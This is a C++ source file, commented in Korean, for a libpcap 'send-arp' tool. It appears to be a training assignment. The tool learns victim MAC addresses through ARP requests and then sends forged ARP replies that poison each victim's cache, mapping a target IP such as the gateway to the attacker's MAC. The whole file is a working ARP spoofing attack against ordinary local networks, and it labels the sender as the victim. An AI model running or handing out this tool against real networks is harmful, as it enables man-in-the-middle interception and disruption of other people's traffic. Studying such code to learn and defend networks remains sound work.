#include <cstdio>
#include <cstdlib> //표준 라이브러리
#include <cstring>
#include <unistd.h>
#include <sys/socket.h> //소켓 함수
#include <sys/ioctl.h>  //ioctl 함수
#include <net/if.h>     //네트워크 인터페이스 정의
#include <netinet/in.h> //인터넷 프로토콜 정의
#include <arpa/inet.h>  //IP 변환 함수
#include <pcap.h>
#include <vector>
#include <thread>
#include <chrono>
#include "ethhdr.h"    //이더넷 헤더 구조체
#include "arphdr.h"    //ARP 헤더 구조체

#pragma pack(push, 1) //구조체 멤버 정렬 1바이트 단위로 강제 (패킷 바이트 정렬 문제 방지)
struct EthArpPacket final {
	EthHdr eth_;  //이더넷 헤더
	ArpHdr arp_;  //ARP 헤더
};
#pragma pack(pop) //pack 설정 원복

//--------------------------------------------------
// Sender와 Target IP 쌍을 저장하는 구조체 (초기에는 MAC 모름)
//--------------------------------------------------
struct SenderTargetPair {
	Ip sender_ip;    //피해자 IP
	Ip target_ip;    //스푸핑할 대상 IP
	Mac sender_mac;  //피해자 MAC (ARP로 얻음)
};

//인자가 부족하거나 이상할 때 안내
void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
	printf("        send-arp eth0 192.168.10.2 192.168.10.1 192.168.10.3 192.168.10.1\n");
}

//--------------------------------------------------
// 네트워크 인터페이스 MAC 주소 얻기
// 처음에 잘못된 인터페이스명 쓰면 nullMac 반환
//--------------------------------------------------
Mac getInterfaceMac(const char* interface) {
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);  //AF_INET, UDP 소켓
	if (sockfd < 0) {
		fprintf(stderr, "소켓 생성 실패\n");
		return Mac::nullMac(); //오류 시 null MAC
	}

	struct ifreq ifr;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	ifr.ifr_name[IFNAMSIZ - 1] = '\0';

	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
		fprintf(stderr, "인터페이스 %s의 MAC 주소를 가져올 수 없습니다\n", interface);
		close(sockfd);
		return Mac::nullMac();
	}
	close(sockfd);
	//ioctl 결과를 Mac 객체로 변환
	return Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
}

//--------------------------------------------------
// ARP Request를 보내 피해자의 MAC 주소 얻기
// 처음엔 ARP 패킷 형식을 잘못 설정해 실패했었음
//--------------------------------------------------
Mac getSenderMac(pcap_t* pcap, const char* interface, Ip sender_ip, Mac attacker_mac) {
	EthArpPacket request_packet;
	printf("[ARP 요청] %s의 MAC 주소 요청 중...\n", std::string(sender_ip).c_str());

	//이더넷 헤더: 브로드캐스트로 ARP 요청
	request_packet.eth_.dmac_ = Mac::broadcastMac();
	request_packet.eth_.smac_ = attacker_mac;
	request_packet.eth_.type_ = htons(EthHdr::Arp);

	//ARP 헤더: 요청(request)
	request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	request_packet.arp_.pro_ = htons(EthHdr::Ip4);
	request_packet.arp_.hln_ = Mac::Size;
	request_packet.arp_.pln_ = Ip::Size;
	request_packet.arp_.op_  = htons(ArpHdr::Request);
	request_packet.arp_.smac_= attacker_mac;
	request_packet.arp_.sip_ = htonl(Ip("0.0.0.0")); //SIP임시
	request_packet.arp_.tmac_= Mac::nullMac();
	request_packet.arp_.tip_ = htonl(sender_ip);

	//ARP 요청 전송
	if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&request_packet), sizeof(request_packet)) != 0) {
		fprintf(stderr, "ARP request 전송 실패: %s\n", pcap_geterr(pcap));
		return Mac::nullMac();
	}
	printf("ARP request 전송 완료. 응답 대기...\n");

	//ARP reply 대기: 최대 3초
	struct pcap_pkthdr* header;
	const u_char* packet_data;
	time_t start = time(nullptr);
	while (time(nullptr) - start < 3) {
		int res = pcap_next_ex(pcap, &header, &packet_data);
		if (res == 1 && header->caplen >= sizeof(EthArpPacket)) {
			auto* recv = (EthArpPacket*)packet_data;
			// ARP reply 및 요청 IP와 일치하는지 체크
			if (ntohs(recv->eth_.type_) == EthHdr::Arp &&
				ntohs(recv->arp_.op_)  == ArpHdr::Reply &&
				ntohl(recv->arp_.sip_) == static_cast<uint32_t>(sender_ip)) {
				Mac smac = recv->arp_.smac_;
			printf("[발견] %s의 MAC: %s\n", std::string(sender_ip).c_str(), std::string(smac).c_str());
			return smac;
				}
		} else if (res < 0) {
			fprintf(stderr, "패킷 수신 에러: %s\n", pcap_geterr(pcap));
			break;
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(10));
	}
	fprintf(stderr, "%s의 MAC 주소 찾기 실패 (타임아웃)\n", std::string(sender_ip).c_str());
	return Mac::nullMac();
}

//--------------------------------------------------
// ARP Spoofing 패킷 생성 및 전송
// 피해자의 ARP 캐시에 공격자 MAC을 타겟 IP로 매핑하도록 속임
//--------------------------------------------------
void sendArpSpoofing(pcap_t* pcap, const SenderTargetPair& pair, Mac attacker_mac) {
	EthArpPacket spoof;
	printf("[Spoofing] %s에게 %s가 %s인 것처럼 속임\n",
		   std::string(pair.sender_ip).c_str(),
		   std::string(pair.target_ip).c_str(),
		   std::string(attacker_mac).c_str());

	// Ethernet
	spoof.eth_.dmac_ = pair.sender_mac;
	spoof.eth_.smac_ = attacker_mac;
	spoof.eth_.type_ = htons(EthHdr::Arp);

	// ARP reply
	spoof.arp_.hrd_ = htons(ArpHdr::ETHER);
	spoof.arp_.pro_ = htons(EthHdr::Ip4);
	spoof.arp_.hln_ = Mac::Size;
	spoof.arp_.pln_ = Ip::Size;
	spoof.arp_.op_  = htons(ArpHdr::Reply);
	spoof.arp_.smac_= attacker_mac;            //공격자 MAC
	spoof.arp_.sip_ = htonl(pair.target_ip);   //타겟 IP (Gateway)
	spoof.arp_.tmac_= pair.sender_mac;
	spoof.arp_.tip_ = htonl(pair.sender_ip);

	if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&spoof), sizeof(spoof)) != 0) {
		fprintf(stderr, "ARP spoofing 전송 실패: %s\n", pcap_geterr(pcap));
	} else {
		printf("[전송 성공] spoof 패킷 전송됨\n");
	}
}

int main(int argc, char* argv[]) {
	//인자 개수 체크: 최소 인터페이스, sender, target 필요
	if (argc < 4 || (argc % 2) != 0) {
		usage(); // 인자 오류 시 사용법 출력
		return EXIT_FAILURE;
	}

	const char* dev = argv[1]; //네트워크 인터페이스 이름
	std::vector<SenderTargetPair> pairs;

	//인자로 받은 IP 쌍 파싱
	for (int i = 2; i < argc; i += 2) {
		SenderTargetPair p;
		p.sender_ip = Ip(argv[i]);
		p.target_ip = Ip(argv[i+1]);
		pairs.push_back(p);
		printf("[추가] Sender=%s, Target=%s\n",
			   std::string(p.sender_ip).c_str(), std::string(p.target_ip).c_str());
	}

	//pcap 장치 열기
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (!pcap) {
		fprintf(stderr, "장치 %s 열기 실패: %s\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	//공격자 MAC 주소 얻기
	Mac attacker_mac = getInterfaceMac(dev);
	if (attacker_mac.isNull()) {
		fprintf(stderr, "공격자 MAC 주소 가져오기 실패\n");
		pcap_close(pcap);
		return EXIT_FAILURE;
	}
	printf("[Info] 공격자 MAC: %s\n", std::string(attacker_mac).c_str());

	//각 대상에 대해 ARP 요청 후 스푸핑
	for (auto& p : pairs) {
		p.sender_mac = getSenderMac(pcap, dev, p.sender_ip, attacker_mac);
		if (p.sender_mac.isNull()) {
			fprintf(stderr, "%s MAC 획득 실패\n", std::string(p.sender_ip).c_str());
			continue;
		}
		sendArpSpoofing(pcap, p, attacker_mac);
		std::this_thread::sleep_for(std::chrono::milliseconds(500));
	}

	printf("\n[완료] ARP spoofing 작업 종료\n");
	pcap_close(pcap);
	return EXIT_SUCCESS;
}
